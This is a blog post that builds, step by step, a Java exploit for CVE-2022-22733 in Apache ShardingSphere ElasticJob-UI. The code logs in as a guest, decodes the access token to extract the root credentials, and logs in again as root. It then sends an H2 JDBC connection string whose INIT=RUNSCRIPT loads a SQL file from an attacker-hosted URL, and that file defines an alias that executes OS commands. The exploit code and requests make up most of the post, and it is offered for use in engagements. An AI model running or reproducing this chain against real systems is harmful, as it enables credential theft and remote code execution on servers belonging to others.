# **Introduction**

In the previous blog from here, We have done analysis for `CVE-2022-22733` and understand the root cause of the vulnerability & the issue in details. Now, It's the time to develop an exploit for this vulnerability and take it more further than just escalating our privileges.

# **The Exploit**

As we know from the analysis that to exploit the vulnerability, We need to perform the following steps:

- Login with the low-privileged account.
    
- Obtain the unsecure generated `accessToken`.
    
- Decode the unsecure generated `accessToken`.
    
- Parse the decoded data from the `accessToken`.
    
- Retrieve `root` account credentials from the parsed data.
    
- Login with the `root` account credentials and obtain a full privileges on the application.
    

But, This time we will add a one more step that will allow us to achieve code execution on the target server, By performing the `JDBC Attack` you could read more about it from [here](https://pyn3rd.github.io/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/).

## **Login with the low-privileged account**

So, First we need to perform a login request with the low-privileged account provided by the user. So, what do we need here ?:

- take input from user which is `username` and `password`
    
- The login request and it's form is as the following:
    

Login request:

```
POST /api/login HTTP/1.1
Host: 192.168.0.162:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Access-Token: 
Content-Length: 39
Origin: http://192.168.0.162:8888
DNT: 1
Connection: close
Referer: http://192.168.0.162:8888/

{"username":"guest","password":"guest"}
```

We can see that the request is a `POST` request to the `/api/login` endpoint made to the host of `192.168.0.162` and port `8888`. So, we first need from the user a host and port of the server where the application is running. along with the username and password that we would use for authentication.

```
import java.net.URL;
import java.net.HttpURLConnection;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws Exception {
        Scanner scanner = new Scanner(System.in);
        System.out.print("[+] Enter host: ");
        String host = scanner.nextLine();
        System.out.print("[+] Enter port: ");
        String port = scanner.nextLine();
        System.out.print("[+] Enter username: ");
        String username = scanner.nextLine();
        System.out.print("[+] Enter password: ");
        String password = scanner.nextLine();
        scanner.close();
        String url = "http://" + host + ":" + port + "/api/login";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
        con.setRequestProperty("Accept", "application/json, text/plain, */*");
        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
        con.setRequestProperty("Accept-Encoding", "gzip, deflate");
        con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
        con.setRequestProperty("Access-Token", "");
        con.setRequestProperty("Origin", "http://" + host + ":" + port);
        con.setRequestProperty("DNT", "1");
        con.setRequestProperty("Connection", "close");
        con.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
        String body = "{\"username\":\"" + username + "\",\"password\":\"" + password + "\"}";
        con.setDoOutput(true);
        con.getOutputStream().write(body.getBytes("UTF-8"));
        int responseCode = con.getResponseCode();
        System.out.println("[*] Response Code: " + responseCode);
    }
}
```

Here we imported the needed libraries from `java.net` & `java.util` and then read the input of `host`,`port`,`username` and `password` from the user using then closed the scanner object we created:

```
Scanner scanner = new Scanner(System.in);
System.out.print("[+] Enter host: ");
String host = scanner.nextLine();
System.out.print("[+] Enter port: ");
String port = scanner.nextLine();
System.out.print("[+] Enter username: ");
String username = scanner.nextLine();
System.out.print("[+] Enter password: ");
String password = scanner.nextLine();
scanner.close();
```

After that we created a `URL` object to handle the `URL` for login endpoint inside the `obj`, Then we created `Http` connection to our `URL` object and assign the connection to `con` which is the `Http` connection object:

```
String url = "http://" + host + ":" + port + "/api/login";
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
```

In the coming lines, We set the request method and the headers needed for the request through the methods under the `con` object:

```
con.setRequestMethod("POST");
con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
con.setRequestProperty("Accept", "application/json, text/plain, */*");
con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
con.setRequestProperty("Accept-Encoding", "gzip, deflate");
con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
con.setRequestProperty("Access-Token", "");
con.setRequestProperty("Origin", "http://" + host + ":" + port);
con.setRequestProperty("DNT", "1");
con.setRequestProperty("Connection", "close");
con.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
```

Finally, We created the request body and pass the user input to it and pass it to the `con` Http object to be included in the request & after that to print us the Response status code:

```
con.setDoOutput(true);
con.getOutputStream().write(body.getBytes("UTF-8"));
int responseCode = con.getResponseCode();
System.out.println("[*] Response Code: " + responseCode);
```

Now, It's time to try our first step code:

&nbsp;

![](/assets/images/828f2427610f835ed9765a69f755244f)

&nbsp;

As we can see our first step done successfully, Let's move to the next step.

## **Obtain the accessToken**

Now, Let's send the normal login request within burp suite repeater, We can see that the response body is a `JSON` format:

![](/assets/images/72ad1e367cc5679ee80dbfc5daa06414)

&nbsp;

As we focusing here we focus on the value of `accessToken` key with in `JSON` data. But, We can see that the `accessToken` key is under `model` array. So, When we parse the `JSON` data we will get the value of `model` array then get the `accessToken` value from it.

```
BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
String inputLine;
StringBuffer response = new StringBuffer();
while ((inputLine = in.readLine()) != null) {
    response.append(inputLine);
}
in.close();
JSONObject jsonObject = new JSONObject(response.toString());
JSONObject model = jsonObject.getJSONObject("model");
String accessToken = model.getString("accessToken");
System.out.println("[*] Acess Token: " + accessToken);
```

After importing the new needed modules `java.io.BufferedReader`,`org.json.JSONObject`,`java.io.InputStreamReader`. Here we created a `BufferReader` object named `in` and assign response we got from the application into it, Then we define a String named `inputLine` to use it in our loop to store the response lines and then assign it to the `StringBuffer` object named `response` which gonna contain the `JSON` data we want. then we closed `in`. After that we define a `JSON` object named `jsonObject` and store the `response` in it as a string format, Then we created another `JSON` object named `model` and store the value of `model` key from the `JSON` data in it, Finally we created a string named `accessToken` and assign the value of `accessToken` key inside `model` array into it and print that value out.

![](/assets/images/9d9e228c9d68a5480936b39b85728877)

And here we can see, Step 2 of our exploit is done.

## **Decode the accessToken**

We can easily identify that the `accessToken` value is `base64`, So, Now we need to decode it to a normal string. And this will be done easily using the following 2 lines after importing the needed modules `java.nio.charset.StandardCharsets`,`java.util.Base64`:

```
byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));
String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);
System.out.println("[*] Decoded Acess Token: " + decodedAccessToken);
```

Here we created a `byte` array named `decodedBytes` that will decode the `accessToken` value and store inside it, After that define a string named `decodedAccessToken` that will store the bytes after converting it to a string and then will be printed out.

![](/assets/images/acb5f8074f259ba69950c679547c2f42)

&nbsp;

Here we can see see the decoded token and the 3rd step of the exploit done successfully.

## **Parse the decoded data from the accessToken & Retrive root account credentials**

It's time now for step 4 & 5. As the decoded data from the `accessToken` is `JSON` format. Then let's part it and Retrieve the `root` account credentials.

```
JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);
String rootUsername = "";
String rootPassword = "";
if (decodedJsonObject.has("rootUsername") && decodedJsonObject.has("rootPassword")) {
    rootUsername = decodedJsonObject.getString("rootUsername");
    rootPassword = decodedJsonObject.getString("rootPassword");
    System.out.println("[*] Root username: " + rootUsername);
    System.out.println("[*] Root password: " + rootPassword);
} else {
    System.out.println("[-] Access token does not contain rootUsername and rootPassword keys.");
}
```

We created a `JSON` object named `decodedJsonObject` and assign the decoded `accessToken` value to it, Then define 2 strings with empty value for username and password we will retrive later. After that we made `if` condition to check if the `JSON` data has the `rootUsername` & `rootPassword` keys to Retrievethe credentials from it, If it's exist then it will assign the values to the string variables we defined early which are `rootUsername` & `rootPassword` after that it will print the values out, And if not found, It will print us a massege telling us it's not found.

![](/assets/images/7dfee9044aacbfe41207479c803b0cbd)

  
And here we can see our 4th & 5th steps done successfully.

## **Login with the** `root` account credentials and obtain a full privileges on the application

Now, we want to use the root credentials we obtained, To login into the application and Retrieve the `accessToken` will back with the response which is gonna be with full privileges on the application as the authentication done with the `root` account.

```
HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();
            con3.setRequestMethod("POST");
            con3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con3.setRequestProperty("Accept", "application/json, text/plain, */*");
            con3.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con3.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con3.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con3.setRequestProperty("Access-Token", "");
            con3.setRequestProperty("Origin", "http://" + host + ":" + port);
            con3.setRequestProperty("DNT", "1");
            con3.setRequestProperty("Connection", "close");
            con3.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            String requestBody3 = "{\"username\":\"" + rootUsername + "\",\"password\":\"" + rootPassword + "\"}";
            con3.setDoOutput(true);
            con3.getOutputStream().write(requestBody3.getBytes("UTF-8"));
            int responseCode3 = con3.getResponseCode();
            System.out.println("[*] Root Login Response Code: " + responseCode3);
            BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));
            String inputLine3;
            StringBuffer response3 = new StringBuffer();
            while ((inputLine3 = in3.readLine()) != null) {
                response3.append(inputLine3);
            }
            in3.close();
            JSONObject jsonObject3 = new JSONObject(response3.toString());
            JSONObject model3 = jsonObject3.getJSONObject("model");
            String accessToken3 = model3.getString("accessToken");
            System.out.println("[*] Root Access Token: " + accessToken3);
```

Here we created a new `Http` Object named `con3` and used the same `URL` for login, In short, We copied the first login request but replaced the login credentials with the one we obtained from the first login process and parsed the new `accessToken` returned as a results from the `root` account authentication & Stored it in `accessToken3` variable and printed it out.

![](/assets/images/d9105296b6f6c821f50d2df9e012139f)

Here as we can see it's done successfully and Retrieved the token based on the `root` account.

## **Achieve RCE**

Now, You may be wondering, If we have the `root` account credentials, Why we would need to Retrieve it's token ?. So, Basically to perform a connection throug the `JDBC` we need high-privileges and to automate this process let's see how it works first.

&nbsp;

![](/assets/images/dca34df301e10d7d6603820a469e99cd)

  
As you can see when we logged-in as `guest` we are not able to add any data source. But, If we login with the `root` account. We can see that we have the privileges to add data source and test the connection

![](/assets/images/ec2f7d061af25c788d4c7798b12f36fa)

&nbsp;

Now, Under the Event Tracer Data Source click on `Add` button and add the following:

![](/assets/images/668b686db6b362a05506f578236eaf4d)

  
What did we done here?. We named Our data source, then used the `h2 driver` the `H2` itself is a relational database management system, and the `org.h2.driver` is a `JDBC` driver used to connect to an `H2` database from Java. The `URL` value:

```
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'
```

Basically, This is a `JDBC` connection string which will connect a `H2` in memory database with the name we give which is `testdb`. Then, `TRACE_LEVEL_SYSTEM_OUT=3` parameter enables trace logging to be printed to the console. Finally, `INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'` parameter specifies that the `poc.sql` script located at our `URL` should be executed when the database is initialized. But, What is inside `poc.sql` file ?:

```
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "123";}';CALL EXEC ('calc.exe')
```

In short words, This sql script uses the `H2` database ability to create an alias to execute command and here we executing `calc.exe` for the demo of the exploit. Now, Let's start our http server that will host our `poc.sql` script and after that we click on `Test Connect` Button:

![](/assets/images/c638cbe6833b72d759916714e36b31f2)

&nbsp;

It's time now to take the request of the connection and added to our exploit code.

Request:

```
POST /api/data-source/connectTest HTTP/1.1
Host: 192.168.0.162:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Access-Token: Root_access_token
Content-Length: 185
Origin: http://192.168.0.162:8088
DNT: 1
Connection: close
Referer: http://192.168.0.162:8088/
Cookie: JSESSIONID=C9B7BAFA141D48D0D26178AD8F489668

{"name":"azima","driver":"org.h2.Driver","url":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://192.168.0.162:8000/poc.sql'","username":"test","password":"test"}
```

As we can see we will create a new `HTTP` connection object with a new `URL` object for the connection request to perform the `JDBC` Attack. So, Here we need to replace the SQL script `URL` with one provided by the user.

```
String url2 = "http://" + host + ":" + port + "/api/data-source/connectTest";
String requestBody = "{\"name\":\"azima\",\"driver\":\"org.h2.Driver\",\"url\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+JDBC+"'\",\"username\":\"a\",\"password\":\"a\"}";

URL obj2 = new URL(url2);
HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();


con2.setRequestMethod("POST");
con2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
con2.setRequestProperty("Accept", "application/json, text/plain, */*");
con2.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
con2.setRequestProperty("Accept-Encoding", "gzip, deflate");
con2.setRequestProperty("Content-Type", "application/json;charset=utf-8");
con2.setRequestProperty("Access-Token", accessToken3);
con2.setRequestProperty("Origin", "http://" + host + ":" + port);
con2.setRequestProperty("DNT", "1");
con2.setRequestProperty("Connection", "close");
con2.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
con2.setDoOutput(true);


DataOutputStream wr = new DataOutputStream(con2.getOutputStream());
wr.writeBytes(requestBody);
wr.flush();
wr.close();

int responseCode2 = con2.getResponseCode();
System.out.println("[*] JDBC Attack Response Code : " + responseCode2);
BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
String inputLine2 = "";
StringBuffer response2 = new StringBuffer();

while ((inputLine2 = in2.readLine()) != null) {
    response2.append(inputLine2);
}
in2.close();


JSONObject jsonObject2 = new JSONObject(response2.toString());
System.out.println("[*] JDBC Attack Response: " + jsonObject2);
```

Here is the code for our final step and it's not a big different as we already familiar with the `HTTP` connection and with sending & parsing response data. Now, Before we test the full code let's add some `try` & `catch` to handle exceptions & also skip the `SSL` verifications.

# **Conclusion**

Now, We have a full chain of the steps and created our exploit. We can now use it in our next coming engement when we find `Apache ShardingSphere ElasticJob-UI` running. You can find the full code on my github from [here](https://github.com/Zeyad-Azima/CVE-2022-22733).
